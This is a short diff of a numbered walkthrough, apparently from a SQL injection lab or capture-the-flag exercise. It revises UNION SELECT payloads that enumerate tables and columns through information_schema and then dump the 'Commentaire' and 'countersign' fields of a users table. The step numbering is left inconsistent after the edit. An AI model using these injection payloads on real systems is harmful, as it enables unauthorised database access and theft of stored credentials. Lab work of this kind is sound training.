@@ -1,8 +1,8 @@
 1- to get all the tables in the database:
     5 UNION SELECT TABLE_SCHEMA,TABLE_NAME FROM information_schema.tables
-2- we notice that there is a table named users
-3- to get all the columns of the users table:
-    5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = users
+    we know now that users table is in Member_Sql_Injection
+2- to get all the columns of the users table:
+    5 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns
 
 4- 5 UNION SELECT Commentaire,countersign FROM users
 
